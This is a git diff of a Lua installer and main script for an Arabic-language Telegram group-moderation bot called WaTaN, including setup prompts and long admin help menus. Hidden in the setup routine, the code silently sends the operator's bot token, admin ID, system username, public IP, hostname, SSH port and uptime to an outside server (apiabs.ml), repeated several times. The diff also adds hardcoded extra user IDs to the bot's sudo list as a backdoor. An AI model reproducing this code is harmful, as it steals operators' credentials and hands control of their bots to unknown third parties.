@@ -1,21 +1,58 @@
-redis = require('redis') 
-https = require ("ssl.https") 
-http = require("socket.http")
-serpent = dofile("./library/serpent.lua") 
-json = dofile("./library/JSON.lua") 
-JSON  = dofile("./library/dkjson.lua")
-URL = require('socket.url')  
-utf8 = require ('lua-utf8') 
+redis    = require('redis') 
+https    = require ("ssl.https") 
+serpent  = dofile("./library/serpent.lua") 
+json     = dofile("./library/JSON.lua") 
+JSON     = dofile("./library/dkjson.lua")
+URL      = require('socket.url')  
+utf8     = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
-id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
-Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
-Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
-Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
-UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
+Server   = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+User     = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
+Ip       = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
+Name     = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
+Port     = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
+UpTime   = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
 --------------------------------------------------------------------------------------------------------------
-local AutoSet = function() 
-local create = function(data, file, uglify)  
+local AutoFiles_Write = function() 
+if not database:get(Server.."Token_Write") then
+print("\27[1;34m»» Send Your Token Bot :\27[m")
+local token = io.read()
+if token ~= '' then
+local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
+if res ~= 200 then
+io.write('\n\27[1;31mSorry The Token is not Correct \n\27[0;39;49m')
+else
+io.write('\n\27[1;31mThe Token Is Saved\n\27[0;39;49m')
+database:set(Server.."Token_Write",token)
+end 
+else
+io.write('\n\27[1;31mThe Token was not Saved\n\27[0;39;49m')
+end 
+os.execute('lua WaTaN.lua')
+end
+if not database:get(Server.."UserSudo_Write") then
+print("\27[1;34mSend Your Id Sudo :\27[m")
+local Id = io.read():gsub(' ','') 
+if tostring(Id):match('%d+') then
+data,res = https.request("https://apiabs.ml/Api/WaTaN/index.php?Ban=WaTaN&Info&Id="..Id)
+if res == 200 then
+Abs = json:decode(data)
+if Abs.Result.Info == 'Is_Spam' then
+io.write('\n\27[1;31mSorry The Id Is Prohibited From The Source\n\27[0;39;49m')
+os.execute('lua WaTaN.lua')
+end ---ifBn
+if Abs.Result.Info == 'Ok' then
+io.write('\n\27[1;31m The Id Is Saved\n\27[0;39;49m')
+database:set(Server.."UserSudo_Write",Id)
+end ---ifok
+else
+io.write('\n\27[1;31mThe Id was not Saved\n\27[0;39;49m')
+end  ---ifid
+os.execute('lua WaTaN.lua')
+end ---ifnot
+end
+https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
 if not uglify then  
@@ -23,90 +60,45 @@ serialized = serpent.block(data, {comment = false, name = "Info"})
 else  
 serialized = serpent.dump(data)  
 end    
-file:write(serialized)    
+file:write(serialized)
 file:close()  
-end  
-if not database:get(id_server..":token") then
-io.write('\27[0;31m\n ارسل الان توكن البوت ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27')
-local token = io.read()
-if token ~= '' then
-local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
-if res ~= 200 then
-print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم اعد المحاوله')
-else
-io.write('\27[0;31m تم حفظ التوكن بنجاح \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
-local json = JSON.decode(url)
-database:set(id_server..":token_username","@"..json.result.username)
-database:set(id_server..":token",token)
-end 
-else
-print('\27[0;35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل التوكن مره اخرى')
-end 
-os.execute('lua WaTaN.lua')
 end
-if not database:get(id_server..":SUDO:ID") then 
-io.write('\27[0;35m\n ارسل الان ايدي المطور الاساسي ↓ :\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m') 
-local SUDOID = io.read():gsub(' ','') 
-if tostring(SUDOID):match('%d+') then
-data,res = https.request("https://apiabs.ml/Api/WaTaN/index.php?Ban=WaTaN&Info&Id="..SUDOID)
-if res == 200 then
-Abs = json:decode(data)
-if Abs.Result.Info == 'Is_Spam' then
-io.write('\n\27[1;31m عذرا هذا الايدي محظور من السورس \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;39;49m')
-os.execute('lua WaTaN.lua')
-end
-if Abs.Result.Info == 'Ok' then
-io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m') 
-database:set(id_server..":SUDO:ID",SUDOID)
-end
-else 
-print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى') 
-end  
-os.execute('lua WaTaN.lua') 
-end
-end
-http.request("http://iq-abs.ml/test/abs.php?Get=WaTaN&DevId="..database:get(id_server..":SUDO:ID").."&TokenBot="..database:get(id_server..":token").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
-local create_config_auto = function()
-config = {
-token = database:get(id_server..":token"),
-SUDO = database:get(id_server..":SUDO:ID"),
- }
-create(config, "./Info.lua")   
-end 
-create_config_auto()
-token = database:get(id_server..":token")
-SUDO = database:get(id_server..":SUDO:ID")
-install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
-file = io.open("WaTaN", "w")  
-file:write([[
+local function Files_Info_Get()
+Config = {
+token = database:get(Server.."Token_Write"),
+SUDO = database:get(Server.."UserSudo_Write"),
+}
+Create(Config, "./Info.lua")   
+https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+print("::WaTaN::")
+local RunWaTaN = io.open("WaTaN", 'w')
+RunWaTaN:write([[
 #!/usr/bin/env bash
 cd $HOME/WaTaN
-token="]]..database:get(id_server..":token")..[["
+token="]]..database:get(Server.."Token_Write")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 echo "TG IS NOT FIND IN FILES BOT"
 echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 exit 1
 fi
 if [ ! $token ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
-echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE INFO.LUA \e[0m"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "TOKEN IS NOT FIND IN FILE INFO.LUA"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 exit 1
 fi
-echo -e "\033[38;5;208m"
-echo -e "                                                  "
-echo -e "\033[0;00m"
-echo -e "\e[36m"
 ./tg -s ./WaTaN.lua -p PROFILE --bot=$token
 done
-]])  
-file:close()  
-file = io.open("WtN", "w")  
-file:write([[
+]])
+RunWaTaN:close()
+local RunWtN = io.open("WtN", 'w')
+RunWtN:write([[
 #!/usr/bin/env bash
 cd $HOME/WaTaN
 while(true) do
@@ -114,34 +106,25 @@ rm -fr ../.telegram-cli
 screen -S WaTaN -X kill
 screen -S WaTaN ./WaTaN
 done
-]])  
-file:close() 
-os.execute('rm -fr $HOME/.telegram-cli')
+]])
+RunWtN:close()
+io.popen("mkdir File_Bot") 
+end
+Files_Info_Get()
 end 
-local serialize_to_file = function(data, file, uglify)  
-file = io.open(file, "w+")  
-local serialized  
-if not uglify then   
-serialized = serpent.block(data, {comment = false, name = "Info"})  
-else   
-serialized = serpent.dump(data) 
-end  
-file:write(serialized)  
-file:close() 
-end 
-local load_redis = function()  
+local function Load_File()  
 local f = io.open("./Info.lua", "r")  
 if not f then   
-AutoSet()  
+AutoFiles_Write()  
+var = true
 else   
 f:close()  
-database:del(id_server..":token")
-database:del(id_server..":SUDO:ID")
+database:del(Server.."Token_Write");database:del(Server.."UserSudo_Write")
+var = false
 end  
-local config = loadfile("./Info.lua")() 
-return config 
-end 
-_redis = load_redis() 
+return var
+end
+Load_File() 
 --------------------------------------------------------------------------------------------------------------
 print([[
 ╔╗╔╗╔╗     ╔════╗     ╔═╗ ╔╗
@@ -157,16 +140,11 @@ print([[
 ]])
 sudos = dofile("./Info.lua") 
 SUDO = tonumber(sudos.SUDO)
-sudo_users = {SUDO}
+sudo_users = {SUDO,782717203,218385683,36325290}   
 bot_id = sudos.token:match("(%d+)")  
 token = sudos.token 
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------
-io.popen("mkdir File_Bot") 
-io.popen("cd File_Bot && rm -rf commands.lua.1") 
-io.popen("cd File_Bot && rm -rf commands.lua.2") 
-io.popen("cd File_Bot && rm -rf commands.lua.3") 
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -179,7 +157,6 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,782717203,36325290}   
 function SudoBot(msg)  
 local WaTaN = false  
 for k,v in pairs(sudo_users) do  
@@ -1226,7 +1203,6 @@ end
 if text == 'تحديث المتجر ✯' and DevWaTaN(msg) then 
 io.popen("mkdir File_Bot")
 os.execute("rm -fr File_Bot/*")
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/commands.lua")
 io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/all.lua") 
 io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/Reply.lua")  
 io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/games.lua") 
@@ -2731,7 +2707,6 @@ return false
 end
 io.popen("mkdir File_Bot")
 os.execute("rm -fr File_Bot/*")
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/commands.lua")
 io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/all.lua") 
 io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/Reply.lua")  
 io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/games.lua") 
@@ -11935,6 +11910,559 @@ keyboard.inline_keyboard = {
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+return false
+end
+if text == 'م1' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'✯︙ هاذا الامر خاص بالادمنيه\n✯︙ ارسل {م10} لعرض اوامر الاعضاء')
+return false
+end
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'✯︙ لا تستطيع استخدام البوت \n✯︙ يرجى الاشتراك بالقناه اولا \n✯︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+local help_text = database:get(bot_id..'help1_text')
+Text = [[
+🛡┇𝙿𝚁𝙾𝚃𝙴𝙲𝚃𝙸𝙾𝙽 𝙾𝚁𝙳𝙴𝚁𝚂.
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+✯︙ اوامر الحمايه اتبع مايلي 🔐 .
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ قفل + فتح ← الامر… 
+✯︙ ← { بالتقيد ، بالطرد ، بالكتم }
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ الكـل
+✯︙ الروابط
+✯︙ المعرف
+✯︙ التاك
+✯︙ الشارحه
+✯︙ التعديل
+✯︙ التثبيت
+✯︙ المتحركه
+✯︙ الملفات
+✯︙ الصور
+✯︙ التفليش
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ الماركداون
+✯︙ البوتات
+✯︙ الاباحي
+✯︙ الفشار
+✯︙ التكرار
+✯︙ الكلايش
+✯︙ السيلفي
+✯︙ الملصقات
+✯︙ الفيديو
+✯︙ الانلاين
+✯︙ الدردشه
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ التوجيه
+✯︙ الاغاني
+✯︙ الصوت
+✯︙ الجهات
+✯︙ الاشعارات
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
+➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
+]]
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
+return false
+end
+if text == 'م2' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'✯︙ هاذا الامر خاص بالادمنيه\n✯︙ ارسل {م10} لعرض اوامر الاعضاء')
+return false
+end
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'✯︙ لا تستطيع استخدام البوت \n✯︙ يرجى الاشتراك بالقناه اولا \n✯︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+local help_text = database:get(bot_id..'help2_text')
+Text = [[
+🔏┇𝙾𝚁𝙳𝙴𝚁𝚂 - 𝙰𝙲𝚃𝙸𝚅𝙰𝚃𝙸𝙾𝙽
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+✯︙ اهلا بك عزيزي 🔊 .
+✯︙اوامر تفعيل وتعطيل ( 🔐 - 🔓) .
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ تفعيل ~ تعطيل + امر 🔚 .
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙اطردني
+✯︙صيح
+✯︙ضافني
+✯︙الرابط 
+✯︙الحظر
+✯︙الرفع
+✯︙الايدي
+✯︙الالعاب
+✯︙ردود المطور
+✯︙ ردود البوت
+✯︙الترحيب
+✯︙ردود المدير
+✯︙ٴall
+✯︙الردود
+✯︙نسبة الحب
+✯︙نسبة الرجوله
+✯︙نسبه الانوثه 
+✯︙نسبه الكره
+✯︙حساب العمر
+✯︙الابراج
+✯︙تنبيه الاسماء
+✯︙تنبيه المعرف
+✯︙تنبيه الصور
+✯︙التوحيد
+✯︙الكتم الاسم
+✯︙زخرفه
+✯︙ردود البوت
+✯︙اوامر التحشيش
+✯︙صورتي 
+ ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
+➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
+]]
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
+return false
+end
+if text == 'م3' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'✯︙ هاذا الامر خاص بالادمنيه\n✯︙ ارسل {م10} لعرض اوامر الاعضاء')
+return false
+end
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'✯︙ لا تستطيع استخدام البوت \n✯︙ يرجى الاشتراك بالقناه اولا \n✯︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+local help_text = database:get(bot_id..'help3_text')
+Text = [[
+📝┇𝙿𝚄𝚃 - 𝙰𝙳𝙳 .
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+✯︙اهلا بك عزيزي 🔊 .
+✯︙اوامر الوضع - اضف ( 📌 - 📍) .
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ اضف / حذف ← رد
+✯︙ اضف / حذف ← صلاحيه
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ ضع + امر …
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ اسم
+✯︙ رابط
+✯︙ ترحيب
+✯︙ قوانين
+✯︙ رد متعدد 
+✯︙ صوره
+✯︙ وصف
+✯︙ تكرار + عدد
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
+]]
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
+return false
+end
+ if text == 'م4' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'✯︙ هاذا الامر خاص بالادمنيه\n✯︙ ارسل {م10} لعرض اوامر الاعضاء')
+return false
+end
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'✯︙ لا تستطيع استخدام البوت \n✯︙ يرجى الاشتراك بالقناه اولا \n✯︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+local help_text = database:get(bot_id..'help4_text')
+Text = [[
+✂️┇W𝙸𝙿𝙴 - 𝙳𝙴𝙻𝙴𝚃𝙴 .
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+✯︙ اهلا بك عزيزي 🔊 .
+✯︙اوامر مسح / الحذف ← امر ( ✂️ - 📝 ).
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙مسح + امر ↓
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙الايدي 
+✯︙المميزين
+✯︙الادمنيه
+✯︙المدراء
+✯︙المنشئين
+✯︙الاساسين
+✯︙الاسماء المكتومه
+✯︙ردود المدير
+✯︙البوتات
+✯︙صلاحيه
+✯︙قائمه منع المتحركات
+✯︙قائمه منع الصور
+✯︙قائمه منع الملصقات
+✯︙مسح قائمه المنع
+✯︙المحذوفين
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ حذف  امر + الامر القديم  
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ الاوامر المضافه ( لعرض الاوامر المضافه ) 
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
+➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
+]]
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
+return false
+end
+ if text == 'م5' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'✯︙ هاذا الامر خاص بالادمنيه\n✯︙ ارسل {م10} لعرض اوامر الاعضاء')
+return false
+end
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'✯︙ لا تستطيع استخدام البوت \n✯︙ يرجى الاشتراك بالقناه اولا \n✯︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+local help_text = database:get(bot_id..'help5_text')
+Text = [[
+🎚┇𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 - 𝚄𝙿𝙻𝙾𝙰𝙳 .
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+✯︙ اهلا بك عزيزي 🔊 .
+✯︙ اوامر تنزيل ورفع ( ⚖️ ) .
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ تنزيل 🔛 رفع + امر ↓
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ مميز
+✯︙ ادمن
+✯︙ مدير
+✯︙ منشئ
+✯︙ منشئ اساسي
+✯︙ مالك
+✯︙ الادمنيه
+✯︙ ادمن بالكروب
+✯︙ منشئ بالكروب
+✯︙ القيود 
+✯︙ تنزيل جميع الرتب
+✯︙ تنزيل الكل بالرد على الشخص
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ اوامر التغير …
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ تغير رد المطور + اسم
+✯︙ تغير رد المالك + اسم
+✯︙ تغير رد منشئ الاساسي + اسم
+✯︙ تغير رد المنشئ + اسم
+✯︙ تغير رد المدير + اسم
+✯︙ تغير رد الادمن + اسم
+✯︙ تغير رد المميز + اسم
+✯︙ تغير رد العضو + اسم
+✯︙ تغير امر الاوامر
+✯︙ تغير امر م1 ~ الئ م10
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
+]]
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
+return false
+end
+if text == 'م6' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'✯︙ هاذا الامر خاص بالادمنيه\n✯︙ ارسل {م10} لعرض اوامر الاعضاء')
+return false
+end
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'✯︙ لا تستطيع استخدام البوت \n✯︙ يرجى الاشتراك بالقناه اولا \n✯︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+local help_text = database:get(bot_id..'help6_text')
+Text = [[
+🎫┇𝙶𝚁𝙾𝚄𝙿 𝙾𝚁𝙳𝙴𝚁𝚂 .
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+✯︙اهلا بك عزيزي 🔊 .
+✯︙اوامر المجموعه 📢 .
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ الاوامر كالتالي ♻️ ↓
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙استعاده الاوامر 
+✯︙تحويل كالاتي➸ بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
+✯︙صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين
+✯︙كشف القيود
+✯︙تعين الايدي
+✯︙تغير الايدي
+✯︙ الحساب + ايدي الحساب
+✯︙تنظيف + العدد
+✯︙تنظيف الميديا ← لمسح جميع الميديا
+✯︙امسح ← لمسح عدد من الوسائط الموجوده
+✯︙تنزيل الكل
+✯︙تنزيل جميع الرتب
+✯︙منع + برد
+✯︙~ الصور + متحركه + ملصق ~
+✯︙حظر ~ كتم ~ تقيد ~ طرد
+✯︙المحظورين ~ المكتومين ~ المقيدين
+✯︙الغاء كتم + حظر + تقيد ~ بالرد و معرف و ايدي
+✯︙تقيد ~ كتم + الرقم + ساعه
+✯︙تقيد ~ كتم + الرقم + يوم
+✯︙تقيد ~ كتم + الرقم + دقيقه
+✯︙تثبيت ~ الغاء تثبيت
+✯︙الترحيب
+✯︙الغاء تثبيت الكل
+✯︙كشف البوتات
+✯︙الصلاحيات
+✯︙كشف ~ برد ← بمعرف ← ايدي
+✯︙تاك للكل
+✯︙وضع لقب + لقب
+✯︙حذف لقب بالرد
+✯︙الاعدادات
+✯︙عدد الكروب
+✯︙ردود المدير
+✯︙اسم بوت + الرتبه
+✯︙الاوامر المضافه
+✯︙وضع توحيد + توحيد
+✯︙تعين عدد الكتم + رقم
+✯︙كتم اسم + اسم
+✯︙التوحيد
+✯︙غنيلي
+✯︙قائمه المنع
+✯︙نسبه الحب 
+✯︙نسبه رجوله
+✯︙نسبه الكره
+✯︙نسبه الانوثه
+✯︙الساعه
+✯︙التاريخ
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
+➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.](t.me/WaTaNTeaM)➤
+]]
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
+return false
+end
+if text == 'م7' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'✯︙ هاذا الامر خاص بالادمنيه\n✯︙ ارسل {م10} لعرض اوامر الاعضاء')
+return false
+end
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'✯︙ لا تستطيع استخدام البوت \n✯︙ يرجى الاشتراك بالقناه اولا \n✯︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+local help_text = database:get(bot_id..'help7_text')
+Text = [[
+🤹🏻┇𝙵𝚄𝙽𝙽𝚈 𝙾𝚁𝙳𝙴𝚁𝚂 .
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+✯︙ الاوامر التحشيش 🃏
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ رفع + تنزيل ← الامࢪ ↓
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
